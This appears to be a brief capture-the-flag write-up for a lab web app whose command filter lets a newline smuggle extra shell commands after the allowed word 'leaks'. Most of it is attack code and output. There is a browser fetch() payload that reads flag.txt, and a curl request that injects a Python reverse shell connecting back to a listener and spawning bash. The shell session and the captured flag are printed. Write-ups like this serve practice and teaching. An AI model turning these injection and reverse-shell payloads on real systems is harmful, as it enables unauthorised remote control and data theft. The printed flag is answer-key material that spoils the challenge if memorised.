- Analyze source to reveal regex allows newlines through "leaks"
- Dev Console js to send CMDi

```js
fetch("/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ command: "leaks\ncat flag.txt" }),
})
  .then((r) => r.json())
  .then(console.log);
```

- Returns this

```json
{
  "code": 0,
  "ok": true,
  "stderr": "",
  "stdout": "+--------------+---------------------------------------------------------+--------------------+----------+\n| name ▼       | desc                                                    | progress           | link     |\n+--------------+---------------------------------------------------------+--------------------+----------+\n| Unavailable  | Leaks are not available while we fix security concerns. | n/a                | n/a      |\n|              |                                                         |                    |          |\n+--------------+---------------------------------------------------------+--------------------+----------+\nflag{eaec346846596f7976da7e1adb1f326d}\n"
}
```

- Can also do revshell on the VPN

```sh
nc -lvnp PORT

curl -X POST http://10.1.187.238/ -H 'Content-Type: application/json' -d '{"command":"leaks\npython3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\''"}'

guest@f49823018125:/app$ ls
app.py
commands
flag.txt
requirements.txt
static
templates

guest@f49823018125:/app$ cat flag.txt
flag{eaec346846596f7976da7e1adb1f326d}
```
